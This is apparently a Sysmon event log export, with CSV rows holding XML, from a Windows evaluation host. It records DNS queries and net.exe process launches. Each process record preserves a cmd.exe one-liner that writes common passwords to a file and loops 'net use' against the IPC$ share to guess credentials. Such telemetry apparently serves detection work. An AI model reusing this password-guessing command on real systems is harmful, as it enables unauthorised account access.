Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,,,,22,19581,,,C:\Windows\system32\net.exe,,0x8000000000000000,Information,,,"Dns query:

RuleName: -

UtcTime: 2023-12-27 14:52:30.326

ProcessGuid: {f57bd86a-8e11-658c-ca01-000000000f00}

ProcessId: 1048

QueryName: windev2309eval

QueryStatus: 0

QueryResults: fe80::3c85:6ac4:1ab8:5e25;fe80::c03b:b06a:788e:58d4;::ffff:192.168.36.130;::ffff:192.168.126.163;

Image: C:\Windows\system32\net.exe

User: WINDEV2309EVAL\User",Info,,,,,,,{f57bd86a-8e11-658c-ca01-000000000f00},3588,1048,,windev2309eval,fe80::3c85:6ac4:1ab8:5e25;fe80::c03b:b06a:788e:58d4;::ffff:192.168.36.130;::ffff:192.168.126.163;,0,"
      ",-,2023-12-27T20:50:27.1683819Z,,Dns query (rule: DnsQuery),,5164,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 14:52:30.326,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>22</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>22</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T20:50:27.1683819Z""/>
      <EventRecordID>19581</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5164""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 14:52:30.326</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-8e11-658c-ca01-000000000f00}</Data>
      <Data Name=""ProcessId"">1048</Data>
      <Data Name=""QueryName"">windev2309eval</Data>
      <Data Name=""QueryStatus"">0</Data>
      <Data Name=""QueryResults"">fe80::3c85:6ac4:1ab8:5e25;fe80::c03b:b06a:788e:58d4;::ffff:192.168.36.130;::ffff:192.168.126.163;</Data>
      <Data Name=""Image"">C:\Windows\system32\net.exe</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Dns query:

RuleName: -

UtcTime: 2023-12-27 14:52:30.326

ProcessGuid: {f57bd86a-8e11-658c-ca01-000000000f00}

ProcessId: 1048

QueryName: windev2309eval

QueryStatus: 0

QueryResults: fe80::3c85:6ac4:1ab8:5e25;fe80::c03b:b06a:788e:58d4;::ffff:192.168.36.130;::ffff:192.168.126.163;

Image: C:\Windows\system32\net.exe

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Dns query (rule: DnsQuery)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"net  use \\WINDEV2309EVAL\IPC$ /user:""WINDEV2309EVAL\User"" ""Spring2022 ""  ",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Net Command,1,19580,10.0.22621.1 (WinBuild.160101.0800),"MD5=BB1AE49B6B7C53499E94613761A6AC56,SHA256=AFBE51517092256504F797F6A5ABC02515A09D603E8C046AE31D7D7855568E91,IMPHASH=D45C37A5C97135204AD6E116C34946C3",C:\Windows\System32\net.exe,Medium,0x8000000000000000,Information,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,"Process Create:

RuleName: -

UtcTime: 2023-12-27 20:50:25.128

ProcessGuid: {f57bd86a-8e11-658c-ca01-000000000f00}

ProcessId: 1048

Image: C:\Windows\System32\net.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: Net Command

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: net.exe

CommandLine: net  use \\WINDEV2309EVAL\IPC$ /user:""WINDEV2309EVAL\User"" ""Spring2022 ""  

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=BB1AE49B6B7C53499E94613761A6AC56,SHA256=AFBE51517092256504F797F6A5ABC02515A09D603E8C046AE31D7D7855568E91,IMPHASH=D45C37A5C97135204AD6E116C34946C3

ParentProcessGuid: {f57bd86a-8df8-658c-c401-000000000f00}

ParentProcessId: 3460

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""cmd.exe"" /c echo Password1> passwords.txt & echo 1q2w3e4r>> passwords.txt & echo Password!>> passwords.txt & echo Spring2022>> passwords.txt & echo ChangeMe!>> passwords.txt & @FOR /F ""delims="" %p in (passwords.txt) DO @net use %logonserver%\IPC$ /user:""%userdomain%\%username%"" ""%p"" 1>NUL 2>&1 && @echo [*] %username%:%p && @net use /delete %logonserver%\IPC$ > NUL

ParentUser: WINDEV2309EVAL\User",Info,net.exe,"""cmd.exe"" /c echo Password1> passwords.txt & echo 1q2w3e4r>> passwords.txt & echo Password!>> passwords.txt & echo Spring2022>> passwords.txt & echo ChangeMe!>> passwords.txt & @FOR /F ""delims="" %p in (passwords.txt) DO @net use %logonserver%\IPC$ /user:""%userdomain%\%username%"" ""%p"" 1>NUL 2>&1 && @echo [*] %username%:%p && @net use /delete %logonserver%\IPC$ > NUL",C:\Windows\System32\cmd.exe,{f57bd86a-8df8-658c-c401-000000000f00},3460,WINDEV2309EVAL\User,{f57bd86a-8e11-658c-ca01-000000000f00},3588,1048,Microsoft® Windows® Operating System,,,,"
      ",-,2023-12-27T20:50:25.1319136Z,,Process Create (rule: ProcessCreate),1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 20:50:25.128,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T20:50:25.1319136Z""/>
      <EventRecordID>19580</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 20:50:25.128</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-8e11-658c-ca01-000000000f00}</Data>
      <Data Name=""ProcessId"">1048</Data>
      <Data Name=""Image"">C:\Windows\System32\net.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.1 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Net Command</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">net.exe</Data>
      <Data Name=""CommandLine"">net  use \\WINDEV2309EVAL\IPC$ /user:""WINDEV2309EVAL\User"" ""Spring2022 ""  </Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=BB1AE49B6B7C53499E94613761A6AC56,SHA256=AFBE51517092256504F797F6A5ABC02515A09D603E8C046AE31D7D7855568E91,IMPHASH=D45C37A5C97135204AD6E116C34946C3</Data>
      <Data Name=""ParentProcessGuid"">{f57bd86a-8df8-658c-c401-000000000f00}</Data>
      <Data Name=""ParentProcessId"">3460</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\cmd.exe</Data>
      <Data Name=""ParentCommandLine"">""cmd.exe"" /c echo Password1&gt; passwords.txt &amp; echo 1q2w3e4r&gt;&gt; passwords.txt &amp; echo Password!&gt;&gt; passwords.txt &amp; echo Spring2022&gt;&gt; passwords.txt &amp; echo ChangeMe!&gt;&gt; passwords.txt &amp; @FOR /F ""delims="" %p in (passwords.txt) DO @net use %logonserver%\IPC$ /user:""%userdomain%\%username%"" ""%p"" 1&gt;NUL 2&gt;&amp;1 &amp;&amp; @echo [*] %username%:%p &amp;&amp; @net use /delete %logonserver%\IPC$ &gt; NUL</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-27 20:50:25.128

ProcessGuid: {f57bd86a-8e11-658c-ca01-000000000f00}

ProcessId: 1048

Image: C:\Windows\System32\net.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: Net Command

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: net.exe

CommandLine: net  use \\WINDEV2309EVAL\IPC$ /user:""WINDEV2309EVAL\User"" ""Spring2022 ""  

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=BB1AE49B6B7C53499E94613761A6AC56,SHA256=AFBE51517092256504F797F6A5ABC02515A09D603E8C046AE31D7D7855568E91,IMPHASH=D45C37A5C97135204AD6E116C34946C3

ParentProcessGuid: {f57bd86a-8df8-658c-c401-000000000f00}

ParentProcessId: 3460

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""cmd.exe"" /c echo Password1&gt; passwords.txt &amp; echo 1q2w3e4r&gt;&gt; passwords.txt &amp; echo Password!&gt;&gt; passwords.txt &amp; echo Spring2022&gt;&gt; passwords.txt &amp; echo ChangeMe!&gt;&gt; passwords.txt &amp; @FOR /F ""delims="" %p in (passwords.txt) DO @net use %logonserver%\IPC$ /user:""%userdomain%\%username%"" ""%p"" 1&gt;NUL 2&gt;&amp;1 &amp;&amp; @echo [*] %username%:%p &amp;&amp; @net use /delete %logonserver%\IPC$ &gt; NUL

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,,,,22,19579,,,C:\Windows\system32\net.exe,,0x8000000000000000,Information,,,"Dns query:

RuleName: -

UtcTime: 2023-12-27 14:52:22.069

ProcessGuid: {f57bd86a-8e08-658c-c801-000000000f00}

ProcessId: 8204

QueryName: windev2309eval

QueryStatus: 0

QueryResults: fe80::3c85:6ac4:1ab8:5e25;fe80::c03b:b06a:788e:58d4;::ffff:192.168.36.130;::ffff:192.168.126.163;

Image: C:\Windows\system32\net.exe

User: WINDEV2309EVAL\User",Info,,,,,,,{f57bd86a-8e08-658c-c801-000000000f00},3588,8204,,windev2309eval,fe80::3c85:6ac4:1ab8:5e25;fe80::c03b:b06a:788e:58d4;::ffff:192.168.36.130;::ffff:192.168.126.163;,0,"
      ",-,2023-12-27T20:50:18.9327315Z,,Dns query (rule: DnsQuery),,5164,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 14:52:22.069,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>22</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>22</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T20:50:18.9327315Z""/>
      <EventRecordID>19579</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5164""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 14:52:22.069</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-8e08-658c-c801-000000000f00}</Data>
      <Data Name=""ProcessId"">8204</Data>
      <Data Name=""QueryName"">windev2309eval</Data>
      <Data Name=""QueryStatus"">0</Data>
      <Data Name=""QueryResults"">fe80::3c85:6ac4:1ab8:5e25;fe80::c03b:b06a:788e:58d4;::ffff:192.168.36.130;::ffff:192.168.126.163;</Data>
      <Data Name=""Image"">C:\Windows\system32\net.exe</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Dns query:

RuleName: -

UtcTime: 2023-12-27 14:52:22.069

ProcessGuid: {f57bd86a-8e08-658c-c801-000000000f00}

ProcessId: 8204

QueryName: windev2309eval

QueryStatus: 0

QueryResults: fe80::3c85:6ac4:1ab8:5e25;fe80::c03b:b06a:788e:58d4;::ffff:192.168.36.130;::ffff:192.168.126.163;

Image: C:\Windows\system32\net.exe

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Dns query (rule: DnsQuery)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"net  use \\WINDEV2309EVAL\IPC$ /user:""WINDEV2309EVAL\User"" ""Password! ""  ",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Net Command,1,19578,10.0.22621.1 (WinBuild.160101.0800),"MD5=BB1AE49B6B7C53499E94613761A6AC56,SHA256=AFBE51517092256504F797F6A5ABC02515A09D603E8C046AE31D7D7855568E91,IMPHASH=D45C37A5C97135204AD6E116C34946C3",C:\Windows\System32\net.exe,Medium,0x8000000000000000,Information,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,"Process Create:

RuleName: -

UtcTime: 2023-12-27 20:50:16.886

ProcessGuid: {f57bd86a-8e08-658c-c801-000000000f00}

ProcessId: 8204

Image: C:\Windows\System32\net.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: Net Command

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: net.exe

CommandLine: net  use \\WINDEV2309EVAL\IPC$ /user:""WINDEV2309EVAL\User"" ""Password! ""  

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=BB1AE49B6B7C53499E94613761A6AC56,SHA256=AFBE51517092256504F797F6A5ABC02515A09D603E8C046AE31D7D7855568E91,IMPHASH=D45C37A5C97135204AD6E116C34946C3

ParentProcessGuid: {f57bd86a-8df8-658c-c401-000000000f00}

ParentProcessId: 3460

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""cmd.exe"" /c echo Password1> passwords.txt & echo 1q2w3e4r>> passwords.txt & echo Password!>> passwords.txt & echo Spring2022>> passwords.txt & echo ChangeMe!>> passwords.txt & @FOR /F ""delims="" %p in (passwords.txt) DO @net use %logonserver%\IPC$ /user:""%userdomain%\%username%"" ""%p"" 1>NUL 2>&1 && @echo [*] %username%:%p && @net use /delete %logonserver%\IPC$ > NUL

ParentUser: WINDEV2309EVAL\User",Info,net.exe,"""cmd.exe"" /c echo Password1> passwords.txt & echo 1q2w3e4r>> passwords.txt & echo Password!>> passwords.txt & echo Spring2022>> passwords.txt & echo ChangeMe!>> passwords.txt & @FOR /F ""delims="" %p in (passwords.txt) DO @net use %logonserver%\IPC$ /user:""%userdomain%\%username%"" ""%p"" 1>NUL 2>&1 && @echo [*] %username%:%p && @net use /delete %logonserver%\IPC$ > NUL",C:\Windows\System32\cmd.exe,{f57bd86a-8df8-658c-c401-000000000f00},3460,WINDEV2309EVAL\User,{f57bd86a-8e08-658c-c801-000000000f00},3588,8204,Microsoft® Windows® Operating System,,,,"
      ",-,2023-12-27T20:50:16.8883273Z,,Process Create (rule: ProcessCreate),1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 20:50:16.886,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T20:50:16.8883273Z""/>
      <EventRecordID>19578</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 20:50:16.886</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-8e08-658c-c801-000000000f00}</Data>
      <Data Name=""ProcessId"">8204</Data>
      <Data Name=""Image"">C:\Windows\System32\net.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.1 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Net Command</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">net.exe</Data>
      <Data Name=""CommandLine"">net  use \\WINDEV2309EVAL\IPC$ /user:""WINDEV2309EVAL\User"" ""Password! ""  </Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=BB1AE49B6B7C53499E94613761A6AC56,SHA256=AFBE51517092256504F797F6A5ABC02515A09D603E8C046AE31D7D7855568E91,IMPHASH=D45C37A5C97135204AD6E116C34946C3</Data>
      <Data Name=""ParentProcessGuid"">{f57bd86a-8df8-658c-c401-000000000f00}</Data>
      <Data Name=""ParentProcessId"">3460</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\cmd.exe</Data>
      <Data Name=""ParentCommandLine"">""cmd.exe"" /c echo Password1&gt; passwords.txt &amp; echo 1q2w3e4r&gt;&gt; passwords.txt &amp; echo Password!&gt;&gt; passwords.txt &amp; echo Spring2022&gt;&gt; passwords.txt &amp; echo ChangeMe!&gt;&gt; passwords.txt &amp; @FOR /F ""delims="" %p in (passwords.txt) DO @net use %logonserver%\IPC$ /user:""%userdomain%\%username%"" ""%p"" 1&gt;NUL 2&gt;&amp;1 &amp;&amp; @echo [*] %username%:%p &amp;&amp; @net use /delete %logonserver%\IPC$ &gt; NUL</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-27 20:50:16.886

ProcessGuid: {f57bd86a-8e08-658c-c801-000000000f00}

ProcessId: 8204

Image: C:\Windows\System32\net.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: Net Command

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: net.exe

CommandLine: net  use \\WINDEV2309EVAL\IPC$ /user:""WINDEV2309EVAL\User"" ""Password! ""  

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=BB1AE49B6B7C53499E94613761A6AC56,SHA256=AFBE51517092256504F797F6A5ABC02515A09D603E8C046AE31D7D7855568E91,IMPHASH=D45C37A5C97135204AD6E116C34946C3

ParentProcessGuid: {f57bd86a-8df8-658c-c401-000000000f00}

ParentProcessId: 3460

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""cmd.exe"" /c echo Password1&gt; passwords.txt &amp; echo 1q2w3e4r&gt;&gt; passwords.txt &amp; echo Password!&gt;&gt; passwords.txt &amp; echo Spring2022&gt;&gt; passwords.txt &amp; echo ChangeMe!&gt;&gt; passwords.txt &amp; @FOR /F ""delims="" %p in (passwords.txt) DO @net use %logonserver%\IPC$ /user:""%userdomain%\%username%"" ""%p"" 1&gt;NUL 2&gt;&amp;1 &amp;&amp; @echo [*] %username%:%p &amp;&amp; @net use /delete %logonserver%\IPC$ &gt; NUL

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,,,,22,19577,,,C:\Windows\system32\net.exe,,0x8000000000000000,Information,,,"Dns query:

RuleName: -

UtcTime: 2023-12-27 14:52:13.824

ProcessGuid: {f57bd86a-8e00-658c-c701-000000000f00}

ProcessId: 3520

QueryName: windev2309eval

QueryStatus: 0

QueryResults: fe80::3c85:6ac4:1ab8:5e25;fe80::c03b:b06a:788e:58d4;::ffff:192.168.36.130;::ffff:192.168.126.163;

Image: C:\Windows\system32\net.exe

User: WINDEV2309EVAL\User",Info,,,,,,,{f57bd86a-8e00-658c-c701-000000000f00},3588,3520,,windev2309eval,fe80::3c85:6ac4:1ab8:5e25;fe80::c03b:b06a:788e:58d4;::ffff:192.168.36.130;::ffff:192.168.126.163;,0,"
      ",-,2023-12-27T20:50:10.6879086Z,,Dns query (rule: DnsQuery),,5164,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 14:52:13.824,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>22</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>22</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T20:50:10.6879086Z""/>
      <EventRecordID>19577</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5164""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 14:52:13.824</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-8e00-658c-c701-000000000f00}</Data>
      <Data Name=""ProcessId"">3520</Data>
      <Data Name=""QueryName"">windev2309eval</Data>
      <Data Name=""QueryStatus"">0</Data>
      <Data Name=""QueryResults"">fe80::3c85:6ac4:1ab8:5e25;fe80::c03b:b06a:788e:58d4;::ffff:192.168.36.130;::ffff:192.168.126.163;</Data>
      <Data Name=""Image"">C:\Windows\system32\net.exe</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Dns query:

RuleName: -

UtcTime: 2023-12-27 14:52:13.824

ProcessGuid: {f57bd86a-8e00-658c-c701-000000000f00}

ProcessId: 3520

QueryName: windev2309eval

QueryStatus: 0

QueryResults: fe80::3c85:6ac4:1ab8:5e25;fe80::c03b:b06a:788e:58d4;::ffff:192.168.36.130;::ffff:192.168.126.163;

Image: C:\Windows\system32\net.exe

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Dns query (rule: DnsQuery)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"net  use \\WINDEV2309EVAL\IPC$ /user:""WINDEV2309EVAL\User"" ""1q2w3e4r ""  ",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Net Command,1,19576,10.0.22621.1 (WinBuild.160101.0800),"MD5=BB1AE49B6B7C53499E94613761A6AC56,SHA256=AFBE51517092256504F797F6A5ABC02515A09D603E8C046AE31D7D7855568E91,IMPHASH=D45C37A5C97135204AD6E116C34946C3",C:\Windows\System32\net.exe,Medium,0x8000000000000000,Information,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,"Process Create:

RuleName: -

UtcTime: 2023-12-27 20:50:08.633

ProcessGuid: {f57bd86a-8e00-658c-c701-000000000f00}

ProcessId: 3520

Image: C:\Windows\System32\net.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: Net Command

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: net.exe

CommandLine: net  use \\WINDEV2309EVAL\IPC$ /user:""WINDEV2309EVAL\User"" ""1q2w3e4r ""  

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=BB1AE49B6B7C53499E94613761A6AC56,SHA256=AFBE51517092256504F797F6A5ABC02515A09D603E8C046AE31D7D7855568E91,IMPHASH=D45C37A5C97135204AD6E116C34946C3

ParentProcessGuid: {f57bd86a-8df8-658c-c401-000000000f00}

ParentProcessId: 3460

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""cmd.exe"" /c echo Password1> passwords.txt & echo 1q2w3e4r>> passwords.txt & echo Password!>> passwords.txt & echo Spring2022>> passwords.txt & echo ChangeMe!>> passwords.txt & @FOR /F ""delims="" %p in (passwords.txt) DO @net use %logonserver%\IPC$ /user:""%userdomain%\%username%"" ""%p"" 1>NUL 2>&1 && @echo [*] %username%:%p && @net use /delete %logonserver%\IPC$ > NUL

ParentUser: WINDEV2309EVAL\User",Info,net.exe,"""cmd.exe"" /c echo Password1> passwords.txt & echo 1q2w3e4r>> passwords.txt & echo Password!>> passwords.txt & echo Spring2022>> passwords.txt & echo ChangeMe!>> passwords.txt & @FOR /F ""delims="" %p in (passwords.txt) DO @net use %logonserver%\IPC$ /user:""%userdomain%\%username%"" ""%p"" 1>NUL 2>&1 && @echo [*] %username%:%p && @net use /delete %logonserver%\IPC$ > NUL",C:\Windows\System32\cmd.exe,{f57bd86a-8df8-658c-c401-000000000f00},3460,WINDEV2309EVAL\User,{f57bd86a-8e00-658c-c701-000000000f00},3588,3520,Microsoft® Windows® Operating System,,,,"
      ",-,2023-12-27T20:50:08.6355736Z,,Process Create (rule: ProcessCreate),1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 20:50:08.633,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T20:50:08.6355736Z""/>
      <EventRecordID>19576</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 20:50:08.633</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-8e00-658c-c701-000000000f00}</Data>
      <Data Name=""ProcessId"">3520</Data>
      <Data Name=""Image"">C:\Windows\System32\net.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.1 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Net Command</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">net.exe</Data>
      <Data Name=""CommandLine"">net  use \\WINDEV2309EVAL\IPC$ /user:""WINDEV2309EVAL\User"" ""1q2w3e4r ""  </Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=BB1AE49B6B7C53499E94613761A6AC56,SHA256=AFBE51517092256504F797F6A5ABC02515A09D603E8C046AE31D7D7855568E91,IMPHASH=D45C37A5C97135204AD6E116C34946C3</Data>
      <Data Name=""ParentProcessGuid"">{f57bd86a-8df8-658c-c401-000000000f00}</Data>
      <Data Name=""ParentProcessId"">3460</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\cmd.exe</Data>
